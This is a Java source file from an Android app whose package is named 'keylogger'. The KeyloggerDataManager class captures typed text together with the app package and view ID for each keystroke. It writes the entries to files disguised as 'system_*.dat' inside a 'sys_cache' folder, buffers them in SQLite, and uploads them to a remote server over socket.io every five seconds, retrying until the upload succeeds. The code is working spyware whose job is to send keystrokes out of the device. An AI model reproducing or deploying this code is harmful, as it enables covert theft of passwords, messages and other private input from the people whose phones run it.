package com.liuma.app.features.keylogger;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.util.Log;

import com.liuma.app.core.LiumaApp;
import com.liuma.app.core.Protocol;
import com.liuma.app.core.network.SocketClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import io.socket.client.Ack;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class KeyloggerDataManager {

    private static KeyloggerDataManager instance;
    /** Bộ đệm các keystroke dạng JSONObject (có cấu trúc), không còn là raw string */
    private final ConcurrentLinkedQueue<JSONObject> memoryBuffer;
    private final ScheduledExecutorService scheduler;
    private File logFile;
    private final KeystrokeDatabase database;
    private ConnectivityManager.NetworkCallback networkCallback;
    private final AtomicBoolean socketListenerRegistered = new AtomicBoolean(false);
    private final AtomicBoolean syncStarted = new AtomicBoolean(false);
    
    /** Data class to hold flush data for potential retry */
    private static class FlushData {
        final JSONArray liveArray;
        final JSONArray offlineBatch;
        final List<Long> syncedIds;
        final int liveCount;
        final int offlineCount;
        
        FlushData(JSONArray liveArray, JSONArray offlineBatch, List<Long> syncedIds, int liveCount, int offlineCount) {
            this.liveArray = liveArray;
            this.offlineBatch = offlineBatch;
            this.syncedIds = syncedIds;
            this.liveCount = liveCount;
            this.offlineCount = offlineCount;
        }
    }

    /** Giảm từ 15s xuống 5s để giảm độ trễ end-to-end */
    private static final int FLUSH_INTERVAL_SECONDS = 5;
    private static final int MAX_MEMORY_BUFFER = 200;
    private static final int OFFLINE_BATCH_SIZE = 100;
    
    // Retry mechanism constants
    private static final int MAX_RETRY_ATTEMPTS = 3;
    private static final long INITIAL_RETRY_DELAY_MS = 1000;
    private static final long MAX_RETRY_DELAY_MS = 30000;
    
    // Pending flush data for retry
    private volatile FlushData pendingFlush = null;
    private volatile int retryAttempt = 0;
    private volatile long nextRetryTime = 0;

    private KeyloggerDataManager() {
        Context ctx = LiumaApp.getContext();
        this.memoryBuffer = new ConcurrentLinkedQueue<>();
        this.scheduler = Executors.newSingleThreadScheduledExecutor();
        this.database = KeystrokeDatabase.getInstance(ctx);

        File dir = new File(ctx.getFilesDir(), "sys_cache");
        if (!dir.exists()) dir.mkdirs();

        String filename = "system_" + new SimpleDateFormat("yyyyMMdd", Locale.US).format(new Date()) + ".dat";
        this.logFile = new File(dir, filename);

        registerNetworkMonitor(ctx);
    }

    public static synchronized KeyloggerDataManager getInstance() {
        if (instance == null) {
            instance = new KeyloggerDataManager();
        }
        return instance;
    }

    /**
     * Ghi một keystroke mới: tạo JSONObject có cấu trúc, thêm vào memory buffer.
     * File write và DB insert được đẩy sang background thread để tránh ANR.
     */
    public void logEntry(long timestamp, String eventType, String pkg, String cls, String viewId, String text, String extra) {
        // Bước 1: Tạo JSONObject và thêm vào memory buffer (nhanh, trên calling thread)
        try {
            JSONObject entry = new JSONObject();
            entry.put("ts", timestamp);
            entry.put("eventType", eventType);
            entry.put("pkg", pkg != null ? pkg : "");
            entry.put("cls", cls != null ? cls : "");
            entry.put("viewId", viewId != null ? viewId : "");
            entry.put("txt", text != null ? text : "");
            entry.put("extra", extra != null ? extra : "");
            memoryBuffer.add(entry);
        } catch (Exception e) {
            Log.e("KeyloggerDM", "Failed to create JSON entry", e);
        }

        // Bước 2: File + DB IO được đẩy sang scheduler thread để không block main thread
        final String safePkg = pkg != null ? pkg : "";
        final String safeCls = cls != null ? cls : "";
        final String safeViewId = viewId != null ? viewId : "";
        final String safeText = text != null ? text : "";
        final String safeExtra = extra != null ? extra : "";
        scheduler.execute(() -> {
            String timeFormatted = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.US).format(new Date(timestamp));
            String line = "[" + timeFormatted + "][" + eventType + "] pkg=" + safePkg
                + " cls=" + safeCls + " viewId=" + safeViewId + " text=" + safeText + " extra=" + safeExtra;
            appendToFile(line);
            database.insert(timestamp, eventType, safePkg, safeCls, safeViewId, safeText, safeExtra);
        });

        // Nếu buffer đầy, flush ngay (flushToNetwork chạy an toàn trên mọi thread)
        if (memoryBuffer.size() >= MAX_MEMORY_BUFFER) {
            flushToNetwork();
        }
    }

    /**
     * Bắt đầu network sync định kỳ + lắng nghe sự kiện socket connect để flush ngay.
     */
    public void startNetworkSync() {
        // Chỉ schedule một lần duy nhất, tránh duplicate khi service bị restart
        if (!syncStarted.compareAndSet(false, true)) return;

        // Flush định kỳ
        scheduler.scheduleAtFixedRate(() -> {
            if (!memoryBuffer.isEmpty() || database.getUnsyncedCount() > 0) {
                flushToNetwork();
            }
        }, FLUSH_INTERVAL_SECONDS, FLUSH_INTERVAL_SECONDS, TimeUnit.SECONDS);

        // Đăng ký listener socket connect (chạy trên scheduler thread, không block main thread)
        scheduler.execute(() -> {
            if (!socketListenerRegistered.compareAndSet(false, true)) return;
            try {
                io.socket.client.Socket s = SocketClient.getInstance().getSocket();
                if (s != null) {
                    s.on(io.socket.client.Socket.EVENT_CONNECT, args -> {
                        Log.d("KeyloggerDM", "Socket connected — flushing queued keystrokes");
                        try { Thread.sleep(500); } catch (InterruptedException ignored) {
                            Thread.currentThread().interrupt();
                        }
                        // Clear any pending flush on reconnect to avoid duplicate sends
                        clearPendingFlush();
                        flushToNetwork();
                    });
                    Log.d("KeyloggerDM", "Socket connect listener registered");
                }
            } catch (Exception e) {
                Log.d("KeyloggerDM", "Failed to register socket listener: " + e.getMessage());
            }
        });
    }

    /**
     * Flush dữ liệu từ memory buffer (live) và SQLite (offline) lên server.
     * Live data được gửi dưới dạng JSONArray các object có cấu trúc,
     * không còn là raw string blob như phiên bản cũ.
     */
    public void flushToNetwork() {
        if (!isSocketConnected()) {
            Log.d("KeyloggerDM", "Offline — " + database.getUnsyncedCount() + " entries queued");
            return;
        }

        // Drain memory buffer → JSONArray các object có cấu trúc
        JSONArray liveArray = new JSONArray();
        JSONObject entry;
        while ((entry = memoryBuffer.poll()) != null) {
            liveArray.put(entry);
        }

        // Build dedup keys từ live entries để lọc trùng với offline
        java.util.Set<String> liveKeys = new java.util.HashSet<>();
        for (int i = 0; i < liveArray.length(); i++) {
            try {
                JSONObject e = liveArray.getJSONObject(i);
                liveKeys.add(e.optLong("ts") + "|" + e.optString("eventType") + "|" + e.optString("txt"));
            } catch (Exception ignored) {}
        }

        // Lấy unsynced rows từ SQLite, lọc bỏ entry đã có trong live
        List<JSONObject> unsynced = database.getUnsynced(OFFLINE_BATCH_SIZE);
        List<Long> syncedIds = new ArrayList<>();
        JSONArray offlineBatch = new JSONArray();

        for (JSONObject obj : unsynced) {
            try {
                long dbId = obj.getLong("id");
                String key = obj.optLong("ts") + "|" + obj.optString("eventType") + "|" + obj.optString("txt");
                if (liveKeys.contains(key)) {
                    // Đã có trong live → chỉ mark synced, không gửi lại
                    syncedIds.add(dbId);
                } else {
                    // Không trùng → gửi trong offlineBatch
                    offlineBatch.put(obj);
                    syncedIds.add(dbId);
                }
            } catch (Exception ignored) {}
        }

        // Không có gì để gửi
        if (liveArray.length() == 0 && offlineBatch.length() == 0) return;

        try {
            JSONObject json = new JSONObject();
            json.put("live", liveArray);
            json.put("offlineBatch", offlineBatch);
            json.put("offlineCount", offlineBatch.length());
            json.put("totalQueued", database.getUnsyncedCount());
            json.put("timestamp", System.currentTimeMillis());
            json.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()));

            io.socket.client.Socket socket = SocketClient.getInstance().getSocket();
            if (socket != null && socket.connected()) {
                // Store flush data for potential retry
                FlushData flushData = new FlushData(liveArray, offlineBatch, syncedIds, liveArray.length(), offlineBatch.length());
                
                // Send with ack callback
                socket.emit(Protocol.KEYLOGGER, new Object[] { json }, new Ack() {
                    @Override
                    public void call(Object... args) {
                        scheduler.execute(() -> {
                            if (args.length > 0 && args[0] instanceof JSONObject) {
                                try {
                                    JSONObject response = (JSONObject) args[0];
                                    boolean success = response.optBoolean("success", false);
                                    
                                    if (success) {
                                        // Server confirmed receipt - mark as synced
                                        if (!flushData.syncedIds.isEmpty()) {
                                            database.markSynced(flushData.syncedIds);
                                        }
                                        pendingFlush = null;
                                        retryAttempt = 0;
                                        Log.d("KeyloggerDM", "ACK received - flushed " + flushData.liveCount + " live + "
                                            + flushData.offlineCount + " offline entries");
                                    } else {
                                        // Server returned error - schedule retry
                                        String error = response.optString("error", "Unknown error");
                                        Log.w("KeyloggerDM", "Server rejected: " + error + " - scheduling retry");
                                        handleFlushFailure(flushData);
                                    }
                                } catch (Exception e) {
                                    Log.e("KeyloggerDM", "Failed to parse ACK response", e);
                                    handleFlushFailure(flushData);
                                }
                            } else {
                                // No valid ACK received - timeout or network issue
                                Log.w("KeyloggerDM", "No ACK received - timeout or network issue");
                                handleFlushFailure(flushData);
                            }
                        });
                    }
                });
                
                Log.d("KeyloggerDM", "Sending " + liveArray.length() + " live + " + offlineBatch.length() 
                    + " offline entries (waiting for ACK)");
            }
        } catch (Exception e) {
            Log.e("KeyloggerDM", "Socket send failed", e);
            // Store for retry if we have data to send
            if (liveArray.length() > 0 || offlineBatch.length() > 0) {
                List<Long> fallbackSyncedIds = new ArrayList<>();
                FlushData flushData = new FlushData(liveArray, offlineBatch, fallbackSyncedIds, liveArray.length(), offlineBatch.length());
                handleFlushFailure(flushData);
            }
        }
    }
    
    /**
     * Handle flush failure with exponential backoff retry
     */
    private void handleFlushFailure(FlushData flushData) {
        if (retryAttempt >= MAX_RETRY_ATTEMPTS) {
            // Max retries exceeded - put data back to memory buffer for next cycle
            Log.w("KeyloggerDM", "Max retries exceeded - keeping data in queue");
            if (flushData.liveArray != null) {
                for (int i = 0; i < flushData.liveArray.length(); i++) {
                    try {
                        memoryBuffer.add(flushData.liveArray.getJSONObject(i));
                    } catch (Exception ignored) {}
                }
            }
            pendingFlush = null;
            retryAttempt = 0;
            return;
        }
        
        // Store pending flush and schedule retry with exponential backoff
        pendingFlush = flushData;
        retryAttempt++;
        
        long delay = Math.min(INITIAL_RETRY_DELAY_MS * (1L << (retryAttempt - 1)), MAX_RETRY_DELAY_MS);
        nextRetryTime = System.currentTimeMillis() + delay;
        
        Log.d("KeyloggerDM", "Scheduling retry #" + retryAttempt + " in " + delay + "ms");
        scheduler.schedule(this::retryPendingFlush, delay, TimeUnit.MILLISECONDS);
    }
    
    /**
     * Retry sending pending flush data
     */
    private void retryPendingFlush() {
        if (pendingFlush == null || !isSocketConnected()) {
            return;
        }
        
        // Check if it's time for retry
        if (System.currentTimeMillis() < nextRetryTime) {
            return;
        }
        
        Log.d("KeyloggerDM", "Retrying flush (attempt " + retryAttempt + "/" + MAX_RETRY_ATTEMPTS + ")");
        
        try {
            JSONObject json = new JSONObject();
            json.put("live", pendingFlush.liveArray);
            json.put("offlineBatch", pendingFlush.offlineBatch);
            json.put("offlineCount", pendingFlush.offlineCount);
            json.put("totalQueued", database.getUnsyncedCount());
            json.put("timestamp", System.currentTimeMillis());
            json.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()));
            
            io.socket.client.Socket socket = SocketClient.getInstance().getSocket();
            if (socket != null && socket.connected()) {
                socket.emit(Protocol.KEYLOGGER, new Object[] { json }, new Ack() {
                    @Override
                    public void call(Object... args) {
                        scheduler.execute(() -> {
                            if (args.length > 0 && args[0] instanceof JSONObject) {
                                try {
                                    JSONObject response = (JSONObject) args[0];
                                    boolean success = response.optBoolean("success", false);

                                    if (success) {
                                        if (!pendingFlush.syncedIds.isEmpty()) {
                                            database.markSynced(pendingFlush.syncedIds);
                                        }
                                        pendingFlush = null;
                                        retryAttempt = 0;
                                        Log.d("KeyloggerDM", "Retry successful - flushed entries");
                                    } else {
                                        handleFlushFailure(pendingFlush);
                                    }
                                } catch (Exception e) {
                                    Log.e("KeyloggerDM", "Failed to parse ACK response on retry", e);
                                    handleFlushFailure(pendingFlush);
                                }
                            } else {
                                handleFlushFailure(pendingFlush);
                            }
                        });
                    }
                });
            }
        } catch (Exception e) {
            Log.e("KeyloggerDM", "Retry failed", e);
            handleFlushFailure(pendingFlush);
        }
    }

    /**
     * Clear pending flush when network is restored or on reconnect
     */
    public void clearPendingFlush() {
        if (pendingFlush != null && pendingFlush.liveArray != null) {
            for (int i = 0; i < pendingFlush.liveArray.length(); i++) {
                try {
                    memoryBuffer.add(pendingFlush.liveArray.getJSONObject(i));
                } catch (Exception ignored) {}
            }
        }
        pendingFlush = null;
        retryAttempt = 0;
        nextRetryTime = 0;
        Log.d("KeyloggerDM", "Cleared pending flush data");
    }

    private boolean isSocketConnected() {
        try {
            io.socket.client.Socket s = SocketClient.getInstance().getSocket();
            return s != null && s.connected();
        } catch (Exception e) {
            return false;
        }
    }

    private void registerNetworkMonitor(Context ctx) {
        ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm == null) return;

        NetworkRequest req = new NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build();

        networkCallback = new ConnectivityManager.NetworkCallback() {
            @Override
            public void onAvailable(Network network) {
                scheduler.schedule(() -> {
                    if (database.getUnsyncedCount() > 0) {
                        Log.d("KeyloggerDM", "Network restored — flushing " + database.getUnsyncedCount() + " queued entries");
                        flushToNetwork();
                    }
                }, 2, TimeUnit.SECONDS);
            }
        };

        try {
            cm.registerNetworkCallback(req, networkCallback);
        } catch (Exception ignored) {}
    }

    public JSONArray getHistory(long since, int limit) {
        return database.getHistory(since, limit);
    }

    public int getQueuedCount() {
        return database.getUnsyncedCount();
    }
    
    /**
     * Get total pending entries including retry queue
     */
    public int getTotalPendingCount() {
        int count = database.getUnsyncedCount() + memoryBuffer.size();
        if (pendingFlush != null) {
            count += pendingFlush.liveCount + pendingFlush.offlineCount;
        }
        return count;
    }

    private void appendToFile(String line) {
        // Cập nhật logFile nếu đã sang ngày mới (tránh ghi nhầm file của ngày cũ)
        String todayFilename = "system_" + new SimpleDateFormat("yyyyMMdd", Locale.US).format(new Date()) + ".dat";
        if (!logFile.getName().equals(todayFilename)) {
            logFile = new File(logFile.getParentFile(), todayFilename);
        }
        try (FileWriter fw = new FileWriter(logFile, true)) {
            fw.write(line);
            fw.write('\n');
        } catch (IOException e) {
            Log.e("KeyloggerDM", "Failed to append to log file", e);
        }
    }

    public File getLogFile() {
        return logFile;
    }
}
